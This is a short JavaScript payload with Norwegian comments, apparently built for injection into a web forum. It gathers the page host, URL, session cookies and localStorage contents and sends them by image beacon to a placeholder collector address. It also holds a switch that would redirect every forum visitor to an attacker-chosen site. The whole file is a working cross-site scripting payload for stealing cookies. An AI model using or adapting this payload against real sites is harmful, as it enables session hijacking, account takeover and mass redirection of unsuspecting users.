(function(){
  var M='COLLECT-URL'; /* erstattes i steg 4 — cookie-mottak */
  var p='h='+encodeURIComponent(location.host)
       +'&u='+encodeURIComponent(location.href.slice(0,300))
       +'&c='+encodeURIComponent(document.cookie.slice(0,1800))
       +'&ls='+encodeURIComponent((function(){try{var s='';for(var i=0;i<localStorage.length&&i<20;i++){var k=localStorage.key(i);s+=k+'='+String(localStorage.getItem(k)).slice(0,80)+'|';}return s.slice(0,1200);}catch(e){return'';}})());
  new Image().src=M+'?'+p;   /* beacon → mottak */
  window.__sx={go:function(x){location=x;},t:Date.now()};
  var REDIRECT_NAA=false;     /* bytt til true → heile forumet redirectar */
  if(REDIRECT_NAA){ location='https://MIN-NYE-SIDE/'; }
})();
